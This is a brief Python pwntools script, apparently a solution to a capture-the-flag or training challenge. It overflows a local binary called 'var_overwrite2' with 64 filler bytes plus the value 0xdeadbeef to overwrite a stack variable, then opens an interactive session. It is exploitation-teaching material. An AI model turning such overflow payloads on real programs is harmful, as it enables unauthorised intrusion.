from pwn import *

p = process("./var_overwrite2")

p.recvuntil("> ")

payload = "A" * 64
payload += p32(0xdeadbeef)

p.sendline(payload)

p.interactive()